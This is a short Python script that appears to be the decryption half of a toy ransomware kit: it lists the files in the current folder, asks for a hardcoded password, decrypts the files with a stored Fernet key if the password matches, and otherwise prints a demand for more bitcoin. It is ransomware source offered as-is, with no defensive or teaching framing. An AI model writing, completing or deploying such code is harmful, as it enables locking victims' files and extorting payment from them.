#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
files = []
for file in os.listdir():
	if file == "alter.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files) 

with open("thekey.key", "rb") as key:
	seckey = key.read()
secpass = "altisontop"
user_pass  = input("enter your secerete pass")
if user_pass == secpass:
	
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_encrypted = Fernet(seckey).decrypt(contents)
		with open(file , "wb") as thefile:
			thefile.write(contents_encrypted)
	print("congrats your files have been decrypted.")
else:
	print("sorry wrong pass give me more btc")
